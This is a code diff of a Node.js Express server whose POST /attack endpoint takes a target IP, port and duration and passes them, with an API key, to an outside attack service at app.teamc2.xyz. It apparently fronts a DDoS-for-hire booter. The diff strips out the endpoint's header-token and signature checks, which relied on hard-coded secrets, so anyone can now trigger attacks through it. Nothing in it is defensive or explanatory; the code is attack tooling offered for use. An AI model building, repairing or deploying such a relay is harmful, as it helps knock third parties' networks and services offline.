@@ -1,9 +1,10 @@
+// file: server.js
+
 require("dotenv").config();
 
 const express = require("express");
 const axios = require("axios");
 const cors = require("cors");
-const crypto = require("crypto");
 
 const app = express();
 
@@ -14,34 +15,34 @@ app.use(express.json());
 const API_KEY = process.env.API_KEY;
 const PORT = process.env.PORT || 8080;
 
+if (!PORT) {
+  console.error("FATAL: PORT not provided");
+  process.exit(1);
+}
+
 console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
 console.log("Binding PORT:", PORT);
 
-// ================= 🔐 SECURITY =================
+// Global error handlers
+process.on("uncaughtException", (err) => {
+  console.error("UNCAUGHT ERROR:", err);
+});
 
-// 🔐 SECRET (same as Android)
-const SECRET = "SECRET123";
+process.on("unhandledRejection", (err) => {
+  console.error("UNHANDLED PROMISE:", err);
+});
 
-// 🔐 SHA256
-function sha256(data) {
-  return crypto.createHash("sha256").update(data).digest("hex");
-}
+// Health routes
+app.get("/", (req, res) => res.status(200).send("OK"));
+app.get("/health", (req, res) => res.status(200).send("OK"));
+app.get("/test", (req, res) => res.json({ msg: "Test OK" }));
 
-// ================= ROUTES =================
-
-app.get("/", (req, res) => res.send("OK"));
-app.get("/health", (req, res) => res.send("OK"));
-
+// Main API
 app.post("/attack", async (req, res) => {
   try {
-    // 🔐 HEADER CHECK
-    if (req.headers["x-sec"] !== "9xK3pL") {
-      return res.status(403).json({ error: "Forbidden" });
-    }
-
     let { ip, port, time } = req.body;
 
-    // 🔒 Validation
+    // 🔒 Basic validation
     if (!ip || !port || !time) {
       return res.status(400).json({ error: "Missing params" });
     }
@@ -53,25 +54,19 @@ app.post("/attack", async (req, res) => {
       return res.status(400).json({ error: "Invalid port/time" });
     }
 
-    // 🔐 SIGNATURE VERIFY
-    const expected = sha256(ip + port + time + SECRET);
-
-    if (req.headers["x-sign"] !== expected) {
-      return res.status(403).json({ error: "Invalid sign" });
-    }
-
     if (!API_KEY) {
       return res.status(500).json({ error: "API key missing" });
     }
 
-    // 🔥 ORIGINAL LOGIC
     const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
-    const response = await axios.get(url, { timeout: 15000 });
+    const response = await axios.get(url, {
+      timeout: 15000,
+    });
 
     return res.json({
       success: true,
-      data: response.data,
+      data: response.data, // ✅ actual API response
     });
 
   } catch (err) {
@@ -83,14 +78,16 @@ app.post("/attack", async (req, res) => {
   }
 });
 
-// ================= START =================
-
+// Start server
 const server = app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Servers running on port ${PORT}`);
 });
 
 // Graceful shutdown
 process.on("SIGTERM", () => {
   console.log("SIGTERM received. Shutting down...");
-  server.close(() => process.exit(0));
+  server.close(() => {
+    console.log("Server closed");
+    process.exit(0);
+  });
 });
